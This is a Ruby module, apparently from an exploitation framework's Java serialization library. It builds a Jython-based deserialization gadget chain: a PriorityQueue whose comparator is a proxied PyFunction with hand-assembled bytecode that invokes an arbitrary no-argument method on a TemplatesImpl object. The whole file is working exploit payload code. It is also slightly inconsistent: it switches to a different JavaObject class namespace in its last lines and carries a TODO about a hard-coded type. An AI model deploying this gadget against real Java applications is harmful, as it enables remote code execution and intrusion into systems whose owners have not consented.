# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Jython
          def self.make_invoke_noarg(obj, method)
            # TODO: get actual type
            objt = 'Lcom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl;'
            objtype = Model::JavaObject.new('Lorg/python/core/PyType$TypeResolver;', 
                                            'underlying_class' => Model::JavaClass.new(objt))
            wrapped_obj = Model::JavaObject.new('Lorg/python/core/PyObjectDerived;', 
                                                'objtype' => objtype,
                                                'javaProxy' => obj,
                                                'slots' => nil)

            bytecode = [
              0x74, 0x00, 0x00,	# LOAD_GLOBAL 		0 (exp)
              0x69, 0x01, 0x00, 	# LOAD_ATTR 		1 (method)
              0x83, 0x00, 0x00, 	# CALL_FUNCTION  	0
              0x01,	# POP_TOP
              0x64, 0x00, 0x00,	# LOAD_CONST		0
              0x53	# RETURN_VALUE
            ]

            code = Model::JavaObject.new('Lorg/python/core/PyBytecode;', 'varkwargs' => false,
                                         'varargs' => false,
                                         'debug' => false,
                                         'nargs' => 2,
                                         'co_argcount' => 2,
                                         'co_nlocals' => 2,
                                         'co_stacksize' => 10,
                                         'co_flags' => Model::JavaObject.new('Lorg/python/core/CompilerFlags;', 'flags' => Model::JavaObject.new('Ljava/util/HashSet;', {})),
                                         'co_code' => Model::JavaArray.new('B', bytecode),
                                         'co_consts' => Model::JavaArray.new('Lorg/python/core/PyObject;', [Model::JavaObject.new('Lorg/python/core/PyInteger;', 'value' => 0)]),
                                         'co_names' => Model::JavaArray.new('Ljava/lang/String;', ['exp', method]),
                                         'co_varnames' => Model::JavaArray.new('Ljava/lang/String;', []),
                                         'co_filename' => 'noname',
                                         'co_name' => '<module>',
                                         'co_lnotab' => Model::JavaArray.new('B', []))

            globals = Model::JavaObject.new('Lorg/python/core/PyStringMap;', 
                                            'table' => Model::JavaObject.new('Ljava/util/concurrent/ConcurrentHashMap;', 
                                                                             'elements' => { 'exp' => wrapped_obj }))


            handler = Model::JavaObject.new('Lorg/python/core/PyFunction;', 
                                            'func_globals' => globals,
                                            'func_code' => code,
                                            '__name__' => '',
                                            '__module__' => nil)

            comp = Model::JavaProxy.new(['java.util.Comparator'], handler)
            Model::JavaObject.new('Ljava/util/PriorityQueue;', 
                                  'comparator' => comp, 
                                  'elements' => [Java::Serialize::JavaObject.new('Lorg/python/core/PyInteger;', 'value' => 0), Java::Serialize::JavaObject.new('Lorg/python/core/PyInteger;', 'value' => 0)])
          end
        end
      end
    end
  end
end
